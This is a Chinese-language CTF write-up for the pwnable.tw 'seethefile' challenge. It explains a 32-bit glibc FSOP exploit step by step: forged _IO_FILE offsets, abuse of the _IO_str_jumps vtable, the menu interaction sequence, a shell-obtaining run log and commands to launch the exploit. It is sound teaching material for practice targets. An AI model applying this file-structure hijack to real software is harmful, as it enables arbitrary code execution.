# 29 `pwnable.tw — seethefile` 速通笔记（FSOP / `_IO_str_finish`）

> 定性：**全局 `FILE *fp` 被 `%s` 溢出改写 → 伪造 `_IO_FILE` → `fclose` 走
> `_IO_str_finish` 的 `_s._free_buffer` → `system("/bin/sh")`**。
> 32 位 i386，No PIE，Partial RELRO，NX，Canary（与利用无关）。

---

## 1. 二进制结构

```text
checksec: Arch i386-32-little / RELRO Partial / Canary found / NX enabled / PIE disabled
菜单: 1. Open  2. Read  3. Write to screen  4. Close  5. Exit
```

`.bss` 全局对象（No PIE，地址固定）：

| 符号 | 地址 | 大小 | 说明 |
| --- | --- | --- | --- |
| `filename` | `0x804b080` | 0x40 | `scanf("%63s")` 读文件名，含 `flag` 直接 `exit(0)` |
| `magicbuf` | `0x804b0c0` | 0x190 | `fread` 的落点，`puts` 的回显源 |
| `name` | `0x804b260` | 0x20 | 隐藏分支 5 的 `scanf("%s")` → **溢出点** |
| `fp` | `0x804b280` | 4 | `FILE *`，紧跟 `name` → 被溢出覆盖 |

关键函数：

```c
openfile:   scanf("%63s", filename); fp = fopen(filename, "r");
readfile(): memset(magicbuf, 0, 0x190);
            fread(magicbuf, 0x18F, 1, fp);          // 固定 0x18F 字节，只读一次
writefile:  if (strstr(filename,"flag") || strstr(magicbuf,"FLAG")
              || strchr(magicbuf,'}')) exit(1);
            puts(magicbuf);                          // -> 任意文件内容泄漏
closefile:  fclose(fp); fp = 0;
main 选项 5（伪装成 Exit）:
            printf("Leave your name :"); scanf("%s", name);   // 无长度限制
            printf("Thank you %s ,see you next time\n", name);
            if (fp) fclose(fp); exit(0);
```

## 2. 三个原语

1. **任意文件读 + 回显**：`fopen(任意路径)` + `fread` + `puts`
   → `open("/proc/self/maps")` 逐片读，拿 libc base（不需要格式化字符串）。
2. **已知地址的二进制写**：`fopen("/dev/stdin")` 后 `fread(magicbuf, 0x18F, 1, fp)`
   会从 stdin 读 0x18F 字节 → 可以把**带 `\0` 的假 `_IO_FILE`** 灌到 `0x804b0c0`。
3. **可控 `fp`**：`name[0x20]` 后面就是 `fp`，`'A'*0x20 + p32(0x804b0c0)` 即可。

## 3. 假 `_IO_FILE` 布局（i386 / glibc 2.24；2.23 同布局）

写入 `magicbuf = 0x804b0c0`，长度 `0x18F`：

| 偏移 | 值 | 作用 |
| --- | --- | --- |
| `+0x00` | `0xFBAD0000` | `_flags`：过 `CHECK_FILE`；**不能带 `_IO_USER_BUF(0x1)`** |
| `+0x1c` | `magicbuf+0x140` | `_IO_buf_base` → `"/bin/sh"`，即 `system` 的唯一参数 |
| `+0x38` | `0xFFFFFFFF` | `_fileno = -1`，`_IO_file_close_it` 立刻返回，不动真实 fd |
| `+0x48` | `magicbuf+0x130` | `_lock`，指向缓冲区里 12 字节清零的锁（`fclose` 加锁路径要解引用） |
| `+0x94` | `libc+_IO_str_jumps` | vtable，**必须落在 `__libc_IO_vtables` 段内**，否则 `_IO_vtable_check` abort |
| `+0x9c` | `libc+system` | `_s._free_buffer`（i386 上就在 vtable 槽后面） |
| `+0x130` | 12×`\0` | 锁结构体 |
| `+0x140` | `"/bin/sh\0"` | 参数串 |

`_IO_str_finish` 的反汇编（本 libc）：

```asm
 mov  eax, [ebx+0x1c]      ; _IO_buf_base
 test eax, eax  / je  skip
 test BYTE PTR [ebx], 0x1  ; _IO_USER_BUF -> skip
 push eax
 call DWORD PTR [ebx+0x9c] ; _s._free_buffer == system
```

`_IO_str_jumps` 偏移随 libc 版本变（2.24-3ubuntu2.2 i386 是 `0x1B49C0`），
EXP 里不写死：它扫描 `__libc_IO_vtables`，用「`_IO_str_finish` 读 `+0x1c` 且
`call [reg+0x9c]`」+「`_IO_str_overflow` 开头 `test al,0x8`」唯一命中该表。


## 4. 交互序列（提示原文，必须逐字对齐）

```text
"Your choice :"            -> 1
"What do you want to see :"-> /proc/self/maps
  loop: "2"  -> "Read Successful"
        "3"  -> magicbuf 的 0x18F 字节 + 菜单
  直到拼出 "xxxx-xxxx r-xp 00000000 ... /path/libc.so.6"
"4"                        -> 关掉 maps
"1" + "/dev/stdin"         -> 让 fp 指向 stdin 的 FILE
"2"                        -> 阻塞在 fread，随后 send(0x18F 字节假 FILE)
"5"  -> "Leave your name :"-> 'A'*0x20 + p32(0x804b0c0) + '\n'
        -> 打印 "Thank you ..." -> fclose(fp) -> system("/bin/sh")
```

## 5. 坑点

- **`fread` 只读 0x18F 字节**：`/proc/self/maps` 一行就 60+ 字节，libc 行在很后面，
  必须反复「Read + Write to screen」分片抽干（每片 0x18F，拼起来再正则匹配）。
  最后一片之后 `fread` 返回 0、`magicbuf` 全 0，`puts` 只打一个空行 —— 用这个判 EOF。
- **`scanf` 的 stdio 缓冲区会吞 blob**：`sendline("2")` 之后要 `sleep(0.3)`，等
  `scanf` 的 `read()` 先把 `"2\n"` 取走，再把 0x18F 字节的 blob 发过去；否则 blob 被
  `scanf` 读进它自己的缓冲区，`fread` 永远等不到足量数据 → 60 秒后 `alarm` 打印 `Timeout` 退出。
- **`scanf("%s")` 遇空白才停**：名字 payload 后面要自带 `\n`，否则它会继续吞我们的 shell 命令；
  那行命令会留在 scanf 的缓冲区里，`system("/bin/sh")` 之后 sh 读不到 → 看起来"打不通"。
- **`_vtable_offset` 必须是 0**：`fclose` 先看 `fp[0x46]`，非 0 会走去旧接口分支。
- **不能自己造 vtable**：2.24 已经有 `_IO_vtable_check`（`__libc_IO_vtables` 段范围校验），
  假 vtable 放 `.bss` 会直接 abort；必须用 libc 里的 `_IO_str_jumps`。
- **`_fileno = -1`** 让 `_IO_file_close_it` 提前返回；给 0 会去 `_IO_SYSCLOSE`，可能把 stdin 关掉，
  拿到的 shell 就没有输入了。
- **`_lock` 不能是 NULL**：`fclose` 在 `_IO_LINKED` 被 `_IO_un_link` 清掉后会走加锁分支，
  解引用 `fp->_lock`。缓冲区里放一块清零的锁即可。
- 拿到 shell 并 `exit` 之后，libc 还会继续 `free` 假 FILE 的 `buf_base`，打印
  `free(): invalid pointer: 0x804b0c0` —— **这是收尾噪音，不影响已经到手的 shell**。
  EXP 里用 `resource.setrlimit(RLIMIT_CORE, (0,0))` 关掉了 core dump，避免仓库里落 `core.*`。
- 远程 pwnable.tw 是 glibc **2.23**：`system` / `_IO_str_jumps` 都不同，必须按 `LIBC`
  给 i386 2.23 的 `libc.so.6`；不传 `LIBC` 时会退回 2.24 常量（会 segfault）。

## 6. 实测（本机 i386 glibc 2.24-3ubuntu2.2）

```text
[*] system=0x3b020  _IO_str_jumps=0x1b49c0  (libc: ../ret2libc/libc-2.24.so)
[+] libc base = 0xf7e11000  system = 0xf7e4c020
__PWNED__
uid=1000(yfhd5) gid=1000(yfhd5) groups=1000(yfhd5),4(adm),24(cdrom),27(sudo),...
*** Error in `./seethefile': free(): invalid pointer: 0x0804b0c0 ***
[+] shell ok
```

连跑 3 次全成功（`/tmp/e29_{1,2,3}.log`）。

## 7. 复现

```bash
cd '/home/yfhd5/Pwn Writeups/fsop'
source ../.venv/bin/activate

# i386 2.24 附件（loader 不入库，从 deb 解包；libc 复用 ret2libc 里那份）
mkdir -p /tmp/libc224i32 && cd /tmp/libc224i32
# apt-get download libc6:i386=2.24-3ubuntu2.2  或从 archive.ubuntu.com 取同名 deb
dpkg-deb -x libc6_2.24-3ubuntu2.2_i386.deb root
cp root/lib/ld-linux.so.2 root/lib/i386-linux-gnu/libc-2.24.so .
cd '/home/yfhd5/Pwn Writeups/fsop'

I386_LD=/tmp/libc224i32/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc224i32 \
LIBC=../ret2libc/libc-2.24.so \
python 29_pwnable_tw_seethefile_exp.py LOCAL
```

远程：

```bash
HOST=chall.pwnable.tw PORT=10200 LIBC=/path/to/i386/libc-2.23.so \
python 29_pwnable_tw_seethefile_exp.py
# CTF² 之类 TLS 平台再加 SSL=1
```

| 环境变量 | 作用 | 缺省 |
| --- | --- | --- |
| `I386_LD` | i386 `ld-linux.so.2` 路径（`LOCAL` 必填，否则用系统 loader） | 空 |
| `I386_LIBPATH` | `--library-path`，指向 2.24 libc 目录 | 空 |
| `LIBC` | 目标 libc（取 `system` + 扫 `_IO_str_jumps`） | `../ret2libc/libc-2.24.so` |
| `HOST` / `PORT` | 远程地址 / 端口 | 空 / `9999` |
| `SSL` | `1` 时用 TLS 连接 | `0` |

## 8. 识别卡

```text
程序自己 fopen/fread/fclose，FILE * 是 .bss 全局
+ 有 "把文件读进固定 .bss 缓冲" 的菜单项（长度受限但可重复）
+ 某个 %s 输入紧挨着 fp
= FSOP：伪造 _IO_FILE，vtable 用 libc 的 _IO_str_jumps，
  fp+0x9c 放 system，fp+0x1c 放 "/bin/sh" -> fclose 即 getshell
```
